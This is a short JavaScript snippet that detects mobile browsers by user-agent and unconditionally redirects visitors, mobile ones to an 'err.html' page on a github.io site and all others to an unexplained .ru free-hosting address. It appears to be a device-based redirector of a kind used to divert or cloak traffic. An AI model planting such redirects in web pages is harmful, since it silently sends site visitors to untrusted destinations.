var myMobile = {
    Android: function() {
        return navigator.userAgent.match(/Android/i);
    },
    BlackBerry: function() {
        return navigator.userAgent.match(/BlackBerry/i);
    },
    iOS: function() {
        return navigator.userAgent.match(/iPhone|iPad|iPod/i);
    },
    Opera: function() {
        return navigator.userAgent.match(/Opera Mini/i);
    },
    Windows: function() {
        return navigator.userAgent.match(/IEMobile/i);
    },
    any: function() {
        return (myMobile.Android() || 
                myMobile.BlackBerry() || 
                myMobile.iOS() || 
                myMobile.Opera() || 
                myMobile.Windows());
    }
};

if( myMobile.any() ) {
    window.location.replace('https://ogrurchiks.github.io/SSSS/err.html');
}else{
    window.location.replace('http://f0449853.xsph.ru/');
}
